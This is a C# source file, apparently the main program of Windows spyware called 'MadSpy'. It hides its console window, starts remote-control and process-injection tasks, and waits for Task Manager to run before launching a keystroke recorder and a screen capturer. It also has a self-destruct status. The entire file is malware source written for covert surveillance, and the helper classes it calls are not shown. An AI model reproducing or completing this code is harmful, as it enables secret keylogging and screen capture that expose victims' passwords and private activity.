using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.Diagnostics;
using System.IO;
using System.Windows.Media.Imaging;
using System.Windows.Forms;

namespace MadSpy
{
    enum Status 
    {
        Active,
        Sleep,
        Selfdestroy
    }

    class Data 
    {
        public string Agent { get; set; }
        public Status Status { get; set; }
        public string TargetProcess { get; set; }
    }

    class Program
    {
        public static object LOGLOCK = new object();
        public static object IMGLOCK = new object();
        public static object DATALOCK = new object();

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            ShowWindow(handle, SW_HIDE);

            Data data = new Data();
            data.Agent = (new DirectoryInfo(Application.ExecutablePath).Name).Split('.')[0];
            data.Status = Status.Active;
            data.TargetProcess = "taskmgr";

            Task remoteControllerFromRemote = Task.Factory.StartNew(() =>
            {
                RemoteController.FromRemote(data);
            });

            Task injectorTask = Task.Factory.StartNew(() =>
            {
                Injector.Inject(data);
            });

            while (!ProgramsEnumerator.IsRunning(data.TargetProcess))
            {
                Thread.Sleep(2000);
            }

            Task keystrokesRecorderTask = Task.Factory.StartNew(() => 
            {
                KeystrokesRecorder.Record();
            });

            Task screenCapturerTask = Task.Factory.StartNew(() => 
            {
                ScreenCapturer.Capture();
            });

            Task.WaitAll(remoteControllerFromRemote, keystrokesRecorderTask, screenCapturerTask,  injectorTask);
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
